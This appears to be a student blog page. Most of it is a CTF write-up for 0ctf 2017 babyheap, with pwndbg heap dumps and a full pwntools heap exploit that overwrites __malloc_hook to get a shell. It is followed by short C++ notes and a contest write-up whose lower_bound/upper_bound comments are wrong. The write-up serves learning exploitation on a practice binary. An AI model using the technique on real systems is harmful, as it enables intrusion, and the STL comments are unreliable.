<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#payload &#x3D; p64(libc_base+0x3c4aed)</span><br><span class="line">#fill(2, payload)</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x&#x2F;30gx 0x5614ee1f6000</span><br><span class="line">0x5614ee1f6000:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x5614ee1f6010:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6020:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x5614ee1f6030:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6040:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x5614ee1f6050:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6060:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x5614ee1f6070:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6080:	0x0000000000000000	0x0000000000000071</span><br><span class="line">0x5614ee1f6090:	0x00007f6a86e67aed	0x0000000000000000</span><br><span class="line">0x5614ee1f60a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f60b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f60c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f60d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f60e0:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6000</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6020</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6040</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6060</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Free chunk (fastbins) | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6080</span><br><span class="line">Size: 0x71</span><br><span class="line">fd: 0x7f6a86e67aed#修改后的地址</span><br><span class="line"></span><br><span class="line">Free chunk (unsortedbin) | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f60f0</span><br><span class="line">Size: 0x21</span><br><span class="line">fd: 0x7f6a86e67b78</span><br><span class="line">bk: 0x7f6a86e67b78</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x5614ee1f6110</span><br><span class="line">Size: 0x90</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f61a0</span><br><span class="line">Size: 0x20e61</span><br><span class="line"></span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">#接下来申请两遍，即可得到0x7f6a86e67aed地址的块，可以对0x7f6a86e67aed进行数据读写</span><br><span class="line">0x70: 0x5614ee1f6080 —▸ 0x7f6a86e67aed (_IO_wide_data_0+301) ◂— 0x6a86b28ea0000000</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x5614ee1f60f0 —▸ 0x7f6a86e67b78 (main_arena+88) ◂— 0x5614ee1f60f0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure>

<h4 id="14-申请回第一个0x60块"><a href="#14-申请回第一个0x60块" class="headerlink" title="14.申请回第一个0x60块"></a>14.申请回第一个0x60块</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6000</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6020</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6040</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6060</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">#alloc(0x60)</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6080</span><br><span class="line">Size: 0x71</span><br><span class="line"></span><br><span class="line">Free chunk (unsortedbin) | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f60f0</span><br><span class="line">Size: 0x21</span><br><span class="line">fd: 0x7f6a86e67b78</span><br><span class="line">bk: 0x7f6a86e67b78</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x5614ee1f6110</span><br><span class="line">Size: 0x90</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f61a0</span><br><span class="line">Size: 0x20e61</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x7f6a86e67aed (_IO_wide_data_0+301) ◂— 0x6a86b28ea0000000</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x5614ee1f60f0 —▸ 0x7f6a86e67b78 (main_arena+88) ◂— 0x5614ee1f60f0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pwndbg&gt; x&#x2F;30gx 0x7f6a86e67aed</span><br><span class="line">0x7f6a86e67aed &lt;_IO_wide_data_0+301&gt;:	0x6a86e66260000000	0x000000000000007f</span><br><span class="line">0x7f6a86e67afd:	0x6a86b28ea0000000	0x6a86b28a7000007f</span><br><span class="line">0x7f6a86e67b0d &lt;__realloc_hook+5&gt;:	0x000000000000007f	0x0000000000000000</span><br><span class="line">0x7f6a86e67b1d:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f6a86e67b2d &lt;main_arena+13&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f6a86e67b3d &lt;main_arena+29&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f6a86e67b4d &lt;main_arena+45&gt;:	0x6a86e67aed000000	0x000000000000007f</span><br><span class="line">0x7f6a86e67b5d &lt;main_arena+61&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f6a86e67b6d &lt;main_arena+77&gt;:	0x0000000000000000	0x14ee1f61a0000000</span><br><span class="line">0x7f6a86e67b7d &lt;main_arena+93&gt;:	0x14ee1f60f0000056	0x14ee1f60f0000056</span><br><span class="line">0x7f6a86e67b8d &lt;main_arena+109&gt;:	0x14ee1f60f0000056	0x6a86e67b88000056</span><br><span class="line">0x7f6a86e67b9d &lt;main_arena+125&gt;:	0x6a86e67b8800007f	0x6a86e67b9800007f</span><br><span class="line">0x7f6a86e67bad &lt;main_arena+141&gt;:	0x6a86e67b9800007f	0x6a86e67ba800007f</span><br><span class="line">0x7f6a86e67bbd &lt;main_arena+157&gt;:	0x6a86e67ba800007f	0x6a86e67bb800007f</span><br><span class="line">0x7f6a86e67bcd &lt;main_arena+173&gt;:	0x6a86e67bb800007f	0x6a86e67bc800007f</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x7f6a86e67b20 - 0x20</span><br><span class="line">0x7f6a86e67b00 &lt;__memalign_hook&gt;:	0x00007f6a86b28ea0	0x00007f6a86b28a70</span><br><span class="line">0x7f6a86e67b10 &lt;__malloc_hook&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f6a86e67b20 &lt;main_arena&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f6a86e67b30 &lt;main_arena+16&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f6a86e67b40 &lt;main_arena+32&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f6a86e67b50 &lt;main_arena+48&gt;:	0x6a86b28ea0000000	0x0000000000000000</span><br><span class="line">0x7f6a86e67b60 &lt;main_arena+64&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f6a86e67b70 &lt;main_arena+80&gt;:	0x0000000000000000	0x00005614ee1f61a0</span><br><span class="line">0x7f6a86e67b80 &lt;main_arena+96&gt;:	0x00005614ee1f60f0	0x00005614ee1f60f0</span><br><span class="line">0x7f6a86e67b90 &lt;main_arena+112&gt;:	0x00005614ee1f60f0	0x00007f6a86e67b88</span><br><span class="line">0x7f6a86e67ba0 &lt;main_arena+128&gt;:	0x00007f6a86e67b88	0x00007f6a86e67b98</span><br><span class="line">0x7f6a86e67bb0 &lt;main_arena+144&gt;:	0x00007f6a86e67b98	0x00007f6a86e67ba8</span><br><span class="line">0x7f6a86e67bc0 &lt;main_arena+160&gt;:	0x00007f6a86e67ba8	0x00007f6a86e67bb8</span><br><span class="line">0x7f6a86e67bd0 &lt;main_arena+176&gt;:	0x00007f6a86e67bb8	0x00007f6a86e67bc8</span><br><span class="line">0x7f6a86e67be0 &lt;main_arena+192&gt;:	0x00007f6a86e67bc8	0x00007f6a86e67bd8</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x7f6a86e67b20 - 0x20</span><br><span class="line">0x7f6a86e67b00 &lt;__memalign_hook&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f6a86e67b10 &lt;__malloc_hook&gt;:	0x00007f6a86ae826a	0x0000000000000000</span><br><span class="line">0x7f6a86e67b20 &lt;main_arena&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f6a86e67b30 &lt;main_arena+16&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f6a86e67b40 &lt;main_arena+32&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f6a86e67b50 &lt;main_arena+48&gt;:	0x6a86b28ea0000000	0x0000000000000000</span><br><span class="line">0x7f6a86e67b60 &lt;main_arena+64&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f6a86e67b70 &lt;main_arena+80&gt;:	0x0000000000000000	0x00005614ee1f61a0</span><br><span class="line">0x7f6a86e67b80 &lt;main_arena+96&gt;:	0x00005614ee1f60f0	0x00005614ee1f60f0</span><br><span class="line">0x7f6a86e67b90 &lt;main_arena+112&gt;:	0x00005614ee1f60f0	0x00007f6a86e67b88</span><br><span class="line">0x7f6a86e67ba0 &lt;main_arena+128&gt;:	0x00007f6a86e67b88	0x00007f6a86e67b98</span><br><span class="line">0x7f6a86e67bb0 &lt;main_arena+144&gt;:	0x00007f6a86e67b98	0x00007f6a86e67ba8</span><br><span class="line">0x7f6a86e67bc0 &lt;main_arena+160&gt;:	0x00007f6a86e67ba8	0x00007f6a86e67bb8</span><br><span class="line">0x7f6a86e67bd0 &lt;main_arena+176&gt;:	0x00007f6a86e67bb8	0x00007f6a86e67bc8</span><br><span class="line">0x7f6a86e67be0 &lt;main_arena+192&gt;:	0x00007f6a86e67bc8	0x00007f6a86e67bd8</span><br></pre></td></tr></table></figure>

<h4 id="15-申请到假的chunk，修改malloc-hook-gt-gadget"><a href="#15-申请到假的chunk，修改malloc-hook-gt-gadget" class="headerlink" title="15.申请到假的chunk，修改malloc_hook-&gt;gadget"></a>15.申请到假的chunk，修改malloc_hook-&gt;gadget</h4><blockquote>
<p>最后只要执行malloc操作，即可get shell</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">allo(<span class="number">0x60</span>)</span><br><span class="line">allo(<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*(<span class="number">0x8</span>+<span class="number">0x2</span>+<span class="number">0x8</span>+<span class="number">1</span>)</span><br><span class="line">payload += p64(libc_base+<span class="number">0x4526a</span>)</span><br><span class="line"></span><br><span class="line">fill(<span class="number">6</span>,len(payload),payload)</span><br><span class="line"></span><br><span class="line">allo(<span class="number">79</span>)</span><br></pre></td></tr></table></figure>

<h3 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./0ctf_2017_babyheap"</span>)</span><br><span class="line"><span class="comment">#p=remote("node3.buuoj.cn",25261)</span></span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">allo</span><span class="params">(size)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"Command: "</span>)</span><br><span class="line">	p.sendline(str(<span class="number">1</span>))</span><br><span class="line">	p.recvuntil(<span class="string">"Size: "</span>)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fill</span><span class="params">(idx,size,content)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"Command: "</span>)</span><br><span class="line">	p.sendline(str(<span class="number">2</span>))</span><br><span class="line">	p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line">	p.recvuntil(<span class="string">"Size: "</span>)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line">	p.recvuntil(<span class="string">"Content: "</span>)</span><br><span class="line">	p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"Command: "</span>)</span><br><span class="line">	p.sendline(str(<span class="number">3</span>))</span><br><span class="line">	p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dump</span><span class="params">(idx)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"Command: "</span>)</span><br><span class="line">	p.sendline(str(<span class="number">4</span>))</span><br><span class="line">	p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">allo(<span class="number">0x10</span>)<span class="comment">#0</span></span><br><span class="line">allo(<span class="number">0x10</span>)<span class="comment">#1</span></span><br><span class="line">allo(<span class="number">0x10</span>)<span class="comment">#2</span></span><br><span class="line">allo(<span class="number">0x10</span>)<span class="comment">#3</span></span><br><span class="line">allo(<span class="number">0x80</span>)<span class="comment">#4</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x21</span>) + p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x21</span>)</span><br><span class="line">payload += p8(<span class="number">0x80</span>)</span><br><span class="line">fill(<span class="number">0</span>,len(payload),payload)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x21</span>)</span><br><span class="line">fill(<span class="number">3</span>,len(payload),payload)</span><br><span class="line"></span><br><span class="line">allo(<span class="number">0x10</span>)<span class="comment">#1 The original position of 2</span></span><br><span class="line">allo(<span class="number">0x10</span>)<span class="comment">#2 4 Simultaneous pointing</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x91</span>)</span><br><span class="line">fill(<span class="number">3</span>,len(payload),payload)</span><br><span class="line"></span><br><span class="line">allo(<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">dump(<span class="number">2</span>)</span><br><span class="line">content = u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:]+<span class="string">'\x00\x00'</span>)</span><br><span class="line">print(hex(content))</span><br><span class="line">libc_base = (content) - <span class="number">0x3c4b78</span></span><br><span class="line">print(hex(libc_base))</span><br><span class="line"></span><br><span class="line">allo(<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">payload = p64(libc_base + <span class="number">0x3C4AED</span>)</span><br><span class="line">fill(<span class="number">2</span>,len(payload),payload)</span><br><span class="line"></span><br><span class="line">allo(<span class="number">0x60</span>)</span><br><span class="line">allo(<span class="number">0x60</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*(<span class="number">0x8</span>+<span class="number">0x2</span>+<span class="number">0x8</span>+<span class="number">1</span>)</span><br><span class="line">payload += p64(libc_base+<span class="number">0x4526a</span>)</span><br><span class="line"></span><br><span class="line">fill(<span class="number">6</span>,len(payload),payload)</span><br><span class="line"></span><br><span class="line">allo(<span class="number">79</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<blockquote>
<p>常规的堆题流程，，，经典题目</p>
</blockquote>

	
	</div>
  <a type="button" href="/2021/04/19/0ctf-2017-babyheap/#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2021/04/18/算法之数据结构篇/" >算法之数据结构篇</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2021-04-18  </div>
		</div>
	</div>
	


			<div class="entry">
  <div class="row">
	
	
		<h2 id="vector"><a href="#vector" class="headerlink" title="vector"></a>vector</h2><p>###　插入</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">push_back();</span><br></pre></td></tr></table></figure>

<h2 id="unordered-map"><a href="#unordered-map" class="headerlink" title="unordered_map"></a>unordered_map</h2><blockquote>
<p>内部采用的是hash表结构,拥有快速检索的功能。 </p>
</blockquote>
<h3 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">unordered_map</span>&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt; <span class="built_in">map</span>;</span><br></pre></td></tr></table></figure>

<h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">const</span> <span class="keyword">int</span> k:numbers) ++<span class="built_in">map</span>[k];</span><br></pre></td></tr></table></figure>

<h2 id="sort"><a href="#sort" class="headerlink" title="sort"></a>sort</h2><blockquote>
<p>sort两个参数，分别是数组的起始位置和终止位置。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sort(begin, end)</span><br></pre></td></tr></table></figure>

<h2 id="增强for循环"><a href="#增强for循环" class="headerlink" title="增强for循环"></a>增强for循环</h2><blockquote>
<p>其中：前面的需要指定类型，：后面的直接填就行，这里是vector类型的数据</p>
<p>这里val是numbers变量里面的值。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">for(const int val:numbers)</span><br><span class="line">	++mp[val];</span><br></pre></td></tr></table></figure>






	
	</div>
  <a type="button" href="/2021/04/18/算法之数据结构篇/#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2021/04/18/西南科技大学2021届新生赛/" >西南科技大学2021届新生赛</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2021-04-18  </div>
		</div>
	</div>
	


			<div class="entry">
  <div class="row">
	
	
		<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote>
<p>第二次选拔赛，，，，看这个成绩，，，，战况糟糕，，，只做出来了简单题，，，</p>
<p>秉持着什么比赛尽量复现一遍，，，，故今晚就干这个了。。。        ——2021.3.20</p>
<p>题解参考：<a href="https://ac.nowcoder.com/acm/discuss/blogs?tagId=140529" target="_blank" rel="noopener">https://ac.nowcoder.com/acm/discuss/blogs?tagId=140529</a></p>
<p>题目地址：<a href="https://ac.nowcoder.com/acm/contest/12478" target="_blank" rel="noopener">https://ac.nowcoder.com/acm/contest/12478</a></p>
</blockquote>
<h2 id="A-暗号1"><a href="#A-暗号1" class="headerlink" title="A 暗号1"></a>A 暗号1</h2><blockquote>
<p><del>wuwuwu,,,看着还行，，，就写出来容易超时，，，</del></p>
</blockquote>
<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><ol>
<li>将字符串按照第一次出现的顺序替换【使得本质相同的字符串一样】</li>
<li>利用map对字符串进行映射，<code>&lt;string,int&gt;</code>，使得键对应字符串，值对应出现的次数</li>
<li>将map对应string的下标存入数组，最后的查询在区间内的下标个数即可。</li>
</ol>
<h3 id="unordered-map"><a href="#unordered-map" class="headerlink" title="unordered_map"></a>unordered_map</h3><ol>
<li>内部实现哈希表（散列表），将关键码值映射到hash表中的一个位置来访问</li>
<li>查找的时间复杂度位O（1）</li>
<li>元素的排列顺序是无序的。</li>
</ol>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unordered_map&gt;			//头文件</span></span></span><br><span class="line"><span class="built_in">unordered_map</span>&lt;<span class="built_in">string</span>,<span class="keyword">int</span>&gt; id;		<span class="comment">//创建</span></span><br><span class="line">id[s] = ++tot;					   <span class="comment">//赋值</span></span><br></pre></td></tr></table></figure>

<h3 id="upper-bound和lower-bound"><a href="#upper-bound和lower-bound" class="headerlink" title="upper_bound和lower_bound"></a>upper_bound和lower_bound</h3><p>功能：利用<code>二分查找</code>的方法在一个<code>排好序的数组</code>中进行查找的。</p>
<p>特点：</p>
<ol>
<li>从begin到end-1的位置开始查找</li>
<li>二分查找，有序数组</li>
<li>返回找到数字的下标</li>
</ol>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//第一个小于或等于num</span></span><br><span class="line">lower_bound(<span class="built_in">begin</span>,<span class="built_in">end</span>,num);</span><br><span class="line"><span class="comment">//第一个小于num的数字</span></span><br><span class="line">upper_bound(<span class="built_in">begin</span>,<span class="built_in">end</span>,num);</span><br></pre></td></tr></table></figure>

